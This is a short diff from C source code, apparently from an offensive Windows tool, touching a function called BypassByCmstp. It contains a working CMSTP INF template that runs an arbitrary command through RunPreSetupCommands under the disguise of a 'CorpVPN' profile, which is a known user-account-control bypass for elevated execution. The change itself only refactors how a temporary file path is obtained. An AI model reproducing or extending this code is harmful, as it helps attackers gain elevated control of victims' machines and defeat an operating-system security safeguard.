@@ -70,7 +70,7 @@ VOID BypassByCmstp
 	CHAR szFormat[] = "[version]\nSignature=$chicago$\nAdvancedINF=2.5\n\n[DefaultInstall]\nCustomDestination=CustInstDestSectionAllUsers\nRunPreSetupCommands=RunPreSetupCommandsSection\n\n[RunPreSetupCommandsSection]\n%s\ntaskkill / F / IM cmstp.exe\n\n[CustInstDestSectionAllUsers]\n49000,49001=AllUSer_LDIDSection, 7\n\n[AllUSer_LDIDSection]\n\"HKLM\", \"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\", \"ProfileInstallPath\", \" % UnexpectedError % \", \"\"\n\n[Strings]\nServiceName=\"CorpVPN\"\nShortSvcName=\"CorpVPN\"";
 	CHAR szInfData[0x1000];
 	StringCbPrintfA(szInfData, _countof(szInfData), szFormat, lpCommand);
-	GenerateTempPathW(L"CorpVPN.inf", NULL, NULL, &lpTempFile);
+	lpTempFile = GenerateTempPathW(L"CorpVPN.inf", NULL, NULL);
 	if (!WriteToFile(lpTempFile, szInfData, strlen(szInfData))) {
 		goto END;
 	}
